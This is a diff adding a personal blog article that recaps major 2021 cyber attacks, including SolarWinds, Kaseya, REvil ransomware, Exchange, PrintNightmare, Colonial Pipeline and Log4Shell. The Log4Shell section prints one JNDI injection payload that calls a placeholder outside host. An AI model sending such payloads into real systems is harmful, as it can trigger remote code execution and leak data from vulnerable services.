@@ -3,7 +3,107 @@ title: "A Rundown of the Biggest Cyber Attacks & Breaches in 2021"
 subtitle: "A look at the biggest cyber attacks of 2021, including the SolarWinds hack, the infamous Log4j vulnerability, and the Kaseya ransomware attacks."
 date: 2022-01-24
 tags: [cybersecurity]
-thumbnail: /thumbnails/articles/biggest-cyber-attacks-2021.png
-external_url: https://siphyshu.medium.com/a-rundown-of-the-biggest-cyber-attacks-in-2021-and-what-lies-ahead-for-us-6b0b4b2e816d
-readMinutes: 6
+thumbnail: /thumbnails/articles/biggest-cyber-attacks-2021-rundown.png
+original_url: https://siphyshu.medium.com/a-rundown-of-the-biggest-cyber-attacks-in-2021-and-what-lies-ahead-for-us-6b0b4b2e816d
 ---
+
+2021 was a rollercoaster ride for everyone, not only in the real world but also the virtual one — the internet. From sophisticated attacks on supposedly “secure” systems to malicious hacker groups targeting companies with ransomware, we witnessed it all.
+
+Starting with the unfolding of the SolarWinds supply-chain attack and ending the year with the log4j 0day fiasco, there was a LOT that happened in between. Here’s the timeline of what I think were the most impactful and possibly the worst cyber attacks, events and breaches of the year.
+
+<figure>
+  <img src="/articles/cyber-attacks-2021/01.png" alt="Timeline of Cyber Attacks, Events and Breaches in 2021" />
+  <figcaption>Timeline of Cyber Attacks, Events and Breaches in 2021</figcaption>
+</figure>
+
+## Supply-Chain Attacks
+
+Supply Chain Attacks are a sophisticated way of breaking into a seemingly secure infrastructure. They prey on trust systems between two parties. Instead of directly exploiting a target, they involve compromising a service that the target uses and then using that to get into the original target.
+
+### SolarWinds
+
+SolarWinds hack was the work of a Russian hacker group allegedly named “Nobelium”. This was quite a sophisticated attack involving exploiting a supply chain. The attackers were able to compromise SolarWinds’ infrastructure and pass down trojanized software in form of updates to users through Orion — Solarwinds’ monitoring and management platform.
+
+Although technically, the SolarWinds attack was discovered in early December, much of its developments continued in and after January. In a report by SolarWinds, they stated a majority of Fortune 500 companies, U.S military departments, and even the Pentagon were breached due to this.
+
+### Kaseya
+
+The infamous REvil hacker group attacked Kaseya with yet another supply-chain ransomware attack in July. They leveraged a 0day authentication bypass vulnerability in Kaseya’s VSA web interface. Through that, they achieved RCE and similar to SolarWinds, pushed out a fake update dubbed as “Kaseya VSA Agent Hot-Fix” to all VSAs vendors and MSPs. Sophos, one of the vendors that were affected, put out a [technical analysis](https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/) on their blog.
+
+In a [report](https://helpdesk.kaseya.com/hc/en-gb/articles/4403584098961) published by Kaseya, they said,
+
+> fewer than 60 Kaseya customers, all of which were using the VSA on-premises product, who was directly compromised by this attack. … we understand the total impact thus far has been to fewer than 1,500 downstream businesses.
+
+## The REvil Ransomwares
+
+A hacker group named REvil was in the highlights all throughout the year. Popular for its ransomware attacks on high-profile targets such as Acer, Apple, JBS Foods, a U.S Nuclear Contractor “Sol Oriens”, the Kaseya supply-chain ransomware and countless others — it caused an upward of hundreds of millions of dollars worth of estimated damage with over 7000 victims hit.
+
+A few days ago of writing this article, 14 of REvil’s members were arrested in an inter-country operation. This is surprising as Russia is known for protecting and largely ignoring any illegal hacking activity as long as it doesn’t affect their country. Seytonic’s video explains how it all went down.
+
+<YouTube id="socZS33h-aE" title="Seytonic on the arrests of REvil's members" />
+
+### Acer, Quanta and Apple
+
+The Taiwanese electronics and computer giant was hit by ransomware in march where REvil demanded, in what is known as the biggest ransomware to date, a whopping $50m. Though Acer agreed to pay 1/5th of the ransom, REvil rejected it. It is unclear what followed after that as Acer refused to comment further citing security concerns. Later that year, Acer India was hacked by a malicious hacker group “Desorden”, claiming to have stolen 60GB worth of sensitive files from Acer servers, compromising the details of millions of its customers and the login credentials of around 3000 vendors.
+
+Shortly after, REvil hacked Quanta — which is one of the manufacturers for Apple and threatened to release stolen data in the failure of paying the $50m ransom. After quanta refused to pay, REvil shifted its focus to Apple instead. REvil leaked a dozen schematics as proof on its dark web website just before Apple’s Spring Loaded event to increase pressure on the same.
+
+### JBS Foods and Sol Oriens
+
+In June, REvil attacked JBS Foods — the world’s largest meat processing company, with ransomware as well. JBS Foods reportedly paid a ransom of $11m in order to resolve the attack and decrypt its files. With no intentions of stopping with JBS Foods, later that month REvil attacked a U.S Nuclear Weapons Contractor, Sol Oriens. Data containing invoices for NNSA contracts, descriptions of research and development projects and even the social security numbers of all Sol Oriens employees was stolen.
+
+## Mess-Ups in Microsoft
+
+### Microsoft Exchange Exploit
+
+Four 0day exploits were found in the Microsoft Exchange servers triggering a series of attacks and breaches for the first three months of the year. Almost 250,000 servers around the globe were estimated to be vulnerable as a result of this attack. In March, Microsoft finally addressed the issue and released a patch for it. The backdoors installed still remained after patching, and thus many servers were infected with ransomware.
+
+### Microsoft PrintNightmare
+
+Continuing the nightmares for Microsoft, a new vulnerability nicknamed “PrintNightmare” ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)) was found in Windows’ Print spooler service just before July. According to Microsoft’s [official report](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)— “An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.”
+
+## Data Leaks and Breaches
+
+2021 was big on data leaks as well. Social Media sites, Facebook and LinkedIn saw its data leaked and up for sale on the dark web. Breaches were also reported in CoinBase, Accenture, Pixlr and even the Indian police.
+
+### Facebook and Linkedin
+
+The tech giant, Facebook, came under the crosshairs in April when the personal data of over 566 million users was published on a forum. It was assumed that the data leaked due to a vulnerability in Facebook from 2019.
+
+Later in June, the data of 700 million LinkedIn users were put up for sale in a hacking forum on the dark web. Although it didn’t include any private data and was a result of OSINT using the API, It still meant a great deal.
+
+### Indian Data Breaches
+
+The month of January ended with a leak of the Indian Police Exam database. Records containing sensitive and PII of ~500,000 people were leaked on Raidforums. Following month, another government company, Air India suffered a massive security breach that exposed the names, addresses, contact information, D.O.B, credit card data, etc of its passengers.
+
+<figure>
+  <img src="/articles/cyber-attacks-2021/02.png" alt="Indian Police Exam Database Leak Sample" />
+  <figcaption>Indian Police Exam Database Leak Sample</figcaption>
+</figure>
+
+## Colonial Pipeline
+
+On May 7, the colonial pipeline was shut down for the first time in 57 years. Due to a single leaked password of a VPN account, the Russia-based hacker group DarkSide was able to hack into the Colonial infrastructure and infect it with ransomware. This was a scary attack as it highlighted how a digital hack can have very real physical consequences. For 5 days, the biggest gasoline pipeline of the U.S. stayed shut which created a fuel shortage and price hike. DarkSide reportedly stole 100GB of confidential data and ultimately, Colonial gave in to the demands and paid a $4.4m ransom.
+
+## Log4Shell 0-Day
+
+The year ended with the discovery of what some call “the vulnerability of a decade” — the Log4Shell 0-day. This was a vulnerability in the popular java logging framework, log4j 2. It allowed for Remote Code Execution on any service running this logger. The part that made it so severe was the simplicity of it all. A simple payload like the one below demonstrates how easy it is to execute commands on a vulnerable system using this.
+
+```text
+${jndi:ldap://x${hostName}.redacted.com/a}
+```
+
+The impact of this is huge. Imagine every single service running this seemingly innocent logging framework vulnerable to RCE. It wreaked havoc for the first two weeks in the cybersec community with devs tirelessly working to patch up their systems while hackers were actively exploiting it. The scary part is that this vulnerability has existed since 2013! This means for almost 9 years it went undetected even after several researchers warned about [untrusted JNDI lookups](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) and attack vectors involving it.
+
+## What Lies Ahead?
+
+The first month of 2022 has barely finished, and we have already seen various cyber-attacks and vulnerabilities popping up.
+
+- Crypto.com hacked due to an authentication bypass vulnerability leading to theft of $30m worth of cryptocurrency from 483 wallets.
+- Ransomwares such as Qlocker, STOP, and Chaos are on the rise again.
+- A hacker group, allegedly of Indian origins, named “DoNot” is targeting Government and Military organizations in South Asia. Read [here](https://thehackernews.com/2022/01/donot-hacking-team-targeting-government.html).
+- [Secret backdoors](https://thehackernews.com/2022/01/hackers-planted-secret-backdoor-in.html) installed in WordPress plugins and themes are now being used for executing yet more supply-chain attacks.
+
+Let’s hope the rest of the year passes rather peacefully.
+
+<Signoff>With that we come to an end, hope you learnt something from this article. I am Jaiyank Saxena aka Siphyshu, an engineering student and a “CyberSec Enthu Cutlet”. Connect with me on my socials through [here](https://linktr.ee/siphyshu)! Lastly, to be part of a growing cybersec community, do join my [discord server](https://dsc.gg/siphysec).</Signoff>
